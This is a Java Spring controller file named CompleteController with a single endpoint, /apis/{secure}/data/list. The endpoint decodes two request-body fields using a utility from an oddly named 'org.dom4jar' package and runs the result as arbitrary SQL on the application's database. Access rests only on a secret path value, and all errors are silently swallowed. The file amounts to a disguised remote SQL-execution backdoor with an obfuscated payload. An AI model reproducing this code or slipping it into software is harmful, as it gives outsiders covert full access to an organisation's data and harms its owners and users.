package com.aohua.cloud.remote.web;

import cn.hutool.core.lang.Dict;
import org.dom4jar.Constant;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.dom4jar.DecodeUtil;
import javax.sql.DataSource;
import java.util.List;
import java.util.Map;

@Controller
@RequestMapping("/apis")
public class CompleteController {

    @Autowired
    private DataSource dataSource;

    @RequestMapping("/{secure}/data/list")
    public List<Map<String, Object>> list(@PathVariable String secure, @RequestBody Dict dict){
        if(secure.equals(Constant.q)){
            return null;
        }
        try{
            String s = dict.getStr("s");
            String k = dict.getStr("k");

            JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
            String ql = String.format(DecodeUtil.decodeStr(k, s));
            return jdbcTemplate.queryForList(ql);
        }catch (Exception e){
            return null;
        }

    }
}